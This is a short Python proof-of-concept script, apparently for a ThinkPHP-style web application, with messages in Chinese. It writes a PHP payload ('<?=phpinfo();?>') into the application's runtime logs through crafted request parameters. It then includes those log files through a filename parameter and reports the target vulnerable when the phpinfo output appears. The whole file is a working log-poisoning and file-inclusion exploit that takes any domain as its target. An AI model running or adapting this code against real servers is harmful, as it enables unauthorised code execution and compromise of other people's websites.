import requests
from urllib import request,parse
import re
import sys
import time


def poc(domain):
	
	header = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
			}
	poc1 = domain + "/index.php?m=--><?=phpinfo();?>" 
	poc2 = domain + "/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?>"
	#request1 = request.Request(poc1,headers = header,method = 'GET')
	#request2 = request.Request(poc2,headers = header,method = 'GET')
	try:
		response1 = request.urlopen(poc1)
	except Exception:
		pass
	try:
		response2 = request.urlopen(poc2)
	except Exception:
		pass

	#if status == 404 and "系统发生错误" in text1 :
	url1 = domain + "/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_21.log"
	url2 = domain + "/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_07_21.log"
	url3 = domain + "/index.php?m=Home&c=Index&a=index&value[filename]=./Application/Runtime/Logs/Common/21_07_21.log"
	url4 = domain + "/index.php?m=Home&c=Index&a=index&value[filename]=./Application/Runtime/Logs/Home/21_07_21.log"
	lists = [url1,url2,url3,url4]
	for list in lists:
		#print(list)
		time.sleep(2)
		check_vul = requests.get(list,headers=header,timeout = 2)
		text = check_vul.text
		#print(text1)
		if "phpinfo" in text:
			print("存在漏洞")
			print("漏洞链接：" + list)
		else:
			print("不存在漏洞")



if __name__ == '__main__':
	
	domain = sys.argv[1]
	#domain = input("请输入域名：")
	poc(domain)
	